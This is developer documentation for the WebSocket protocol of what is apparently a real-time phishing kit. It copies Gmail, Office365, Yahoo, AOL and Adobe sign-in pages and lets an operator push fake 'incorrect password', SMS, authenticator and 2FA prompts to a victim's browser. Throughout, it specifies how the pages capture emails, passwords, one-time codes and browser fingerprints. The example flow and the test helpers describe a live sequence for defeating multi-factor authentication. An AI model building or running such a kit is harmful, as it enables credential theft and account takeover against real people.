# WebSocket API Contract

## Overview
The frontend connects to the backend via WebSocket at `/ws?sessionId=<sessionId>` to enable real-time, bidirectional communication. This allows the backend to remotely control the UI state and receive user interactions.

## Connection

### WebSocket Endpoint
```
ws://localhost:10000/ws?sessionId=<sessionId>
wss://your-domain.com/ws?sessionId=<sessionId>
```

### Query Parameters
- `sessionId` (required): Unique identifier for the session, generated by the frontend

## Message Format

All messages are JSON objects with the following structure:

```json
{
  "command": "command_name",
  "data": {
    // command-specific data
  }
}
```

## Backend → Frontend Commands

These commands are sent from the backend to control the frontend UI state:

### `show_incorrect_password`
Display an "Incorrect Password" error state.

```json
{
  "command": "show_incorrect_password",
  "data": {
    "provider": "Gmail",  // Optional: Gmail, Office365, Yahoo, AOL, Adobe
    "message": "Custom error message"  // Optional
  }
}
```

### `show_sms_code`
Display an SMS code input prompt.

```json
{
  "command": "show_sms_code",
  "data": {
    "provider": "Gmail",
    "phoneNumber": "+1 (***) ***-1234"  // Optional: masked phone number
  }
}
```

### `show_authenticator_approval`
Display a prompt to approve sign-in via authenticator app.

```json
{
  "command": "show_authenticator_approval",
  "data": {
    "provider": "Office365",
    "appName": "Microsoft Authenticator"  // Optional
  }
}
```

### `show_account_locked`
Display an "Account Locked" message.

```json
{
  "command": "show_account_locked",
  "data": {
    "provider": "Yahoo",
    "message": "Your account has been temporarily locked for security reasons."
  }
}
```

### `show_security_check`
Display a security check loading state.

```json
{
  "command": "show_security_check",
  "data": {
    "provider": "Gmail"
  }
}
```

### `show_two_factor`
Display a two-factor authentication code input.

```json
{
  "command": "show_two_factor",
  "data": {
    "provider": "Office365"
  }
}
```

### `show_email_verification`
Display an email verification code input.

```json
{
  "command": "show_email_verification",
  "data": {
    "provider": "Gmail",
    "email": "user@gmail.com"
  }
}
```

### `hide_state` / `reset`
Hide the current interactive state and return to the normal flow.

```json
{
  "command": "hide_state"
}
```

### `navigate`
Navigate the frontend to a specific route.

```json
{
  "command": "navigate",
  "data": {
    "route": "/login"
  }
}
```

### `connected`
Sent by backend immediately after connection is established (informational).

```json
{
  "command": "connected",
  "data": {
    "sessionId": "abc123",
    "message": "WebSocket connection established"
  }
}
```

### `handshake_ack`
Response to client handshake (informational).

```json
{
  "command": "handshake_ack",
  "data": {
    "status": "success"
  }
}
```

## Frontend → Backend Commands

These commands are sent from the frontend to the backend:

### `handshake`
Initial handshake after connection is established.

```json
{
  "command": "handshake",
  "data": {
    "sessionId": "abc123",
    "userAgent": "Mozilla/5.0 ..."
  }
}
```

### `credentials_submitted`
Sent when user submits login credentials.

```json
{
  "command": "credentials_submitted",
  "data": {
    "email": "user@example.com",
    "password": "***",
    "provider": "Gmail",
    "sessionId": "abc123",
    "timestamp": "2026-04-24T10:00:00.000Z",
    "userAgent": "Mozilla/5.0 ...",
    // ... additional browser fingerprint data
  }
}
```

### `otp_submitted`
Sent when user submits OTP code.

```json
{
  "command": "otp_submitted",
  "data": {
    "otp": "123456",
    "session": {
      // original session data
    }
  }
}
```

### `verification_code`
Sent when user submits SMS or 2FA verification code.

```json
{
  "command": "verification_code",
  "data": {
    "code": "123456",
    "type": "sms"  // or "2fa", "email"
  }
}
```

### `client_action`
Generic action performed by the user.

```json
{
  "command": "client_action",
  "data": {
    "action": "retry",  // or "resend_sms", "contact_support", etc.
    // ... additional action-specific data
  }
}
```

## Provider Theming

The frontend automatically themes UI states based on the `provider` field:

- **Gmail/Google**: Blue theme (#4285f4)
- **Office365/Microsoft/Outlook**: Blue theme (#0078d4)
- **Yahoo**: Purple theme (#6001d2)
- **AOL**: Blue theme (#0066cc)
- **Default/Adobe**: Generic blue theme (#0066cc)

## Example Flow

1. **Frontend connects**:
   ```
   WS: Connect to ws://localhost:10000/ws?sessionId=abc123
   ```

2. **Backend acknowledges**:
   ```json
   { "command": "connected", "data": { "sessionId": "abc123" } }
   ```

3. **Frontend sends handshake**:
   ```json
   { "command": "handshake", "data": { "sessionId": "abc123", "userAgent": "..." } }
   ```

4. **User submits credentials**:
   ```json
   { "command": "credentials_submitted", "data": { "email": "user@gmail.com", "password": "***", ... } }
   ```

5. **Backend triggers incorrect password state**:
   ```json
   { "command": "show_incorrect_password", "data": { "provider": "Gmail" } }
   ```

6. **User retries, backend triggers SMS verification**:
   ```json
   { "command": "show_sms_code", "data": { "provider": "Gmail", "phoneNumber": "+1 (***) ***-1234" } }
   ```

7. **User enters SMS code**:
   ```json
   { "command": "verification_code", "data": { "code": "123456", "type": "sms" } }
   ```

8. **Backend resets state**:
   ```json
   { "command": "hide_state" }
   ```

## Implementation Notes

### Frontend (React)
- WebSocket hook: `/src/hooks/useWebSocket.ts`
- Interactive state component: `/src/components/InteractiveState.tsx`
- Main integration: `/src/App.tsx`

### Backend (Node.js)
- WebSocket server: `/server.js`
- Global helper function: `global.sendWebSocketCommand(sessionId, command, data)`

### Connection Management
- Auto-reconnection: The frontend attempts to reconnect up to 5 times with 2-second delays
- Heartbeat: Not currently implemented (can be added if needed)
- Timeout: Standard WebSocket timeout applies

### Security Considerations
- Always use WSS (secure WebSocket) in production
- Validate sessionId on both sides
- Consider implementing authentication tokens
- Rate limit WebSocket messages
- Sanitize all user input before sending

## Testing

You can test WebSocket commands using the global helper function in the backend:

```javascript
// In server.js or any other backend code
global.sendWebSocketCommand('abc123', 'show_incorrect_password', { 
  provider: 'Gmail' 
});

global.sendWebSocketCommand('abc123', 'show_sms_code', { 
  provider: 'Office365',
  phoneNumber: '+1 (***) ***-5678'
});

global.sendWebSocketCommand('abc123', 'hide_state');
```

Or use a WebSocket client tool to manually send commands.
